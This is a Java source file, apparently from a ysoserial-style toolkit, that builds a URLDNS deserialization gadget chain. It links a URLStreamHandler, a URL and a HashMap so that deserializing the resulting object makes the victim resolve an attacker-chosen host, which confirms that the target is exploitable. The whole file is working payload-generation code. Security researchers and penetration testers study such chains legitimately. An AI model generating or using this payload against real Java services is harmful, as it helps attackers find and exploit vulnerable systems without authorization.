package Node.payload;

import Node.node.HashMap_readObject;
import Node.node.URLStreamHandler_hashCode;
import Node.node.URL_hashCode;
import Node.utils.PayloadRunner;

import java.net.URL;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS1 implements ObjectPayload<Object>{
    public Object getObject(String url) throws Exception {

        //URLStreamHandler_node 起始节点+过程节点
        URLStreamHandler handler= URLStreamHandler_hashCode.init_node();

        //URL 过程节点
        URL url1= URL_hashCode.init_node(url,handler);

        //HashMap 最终节点
        HashMap hashMap= HashMap_readObject.init_node();
        hashMap.put(url1,url);

        //满足自身条件
        URL_hashCode.end_node(url1);

        return hashMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(URLDNS1.class, args);
    }
}
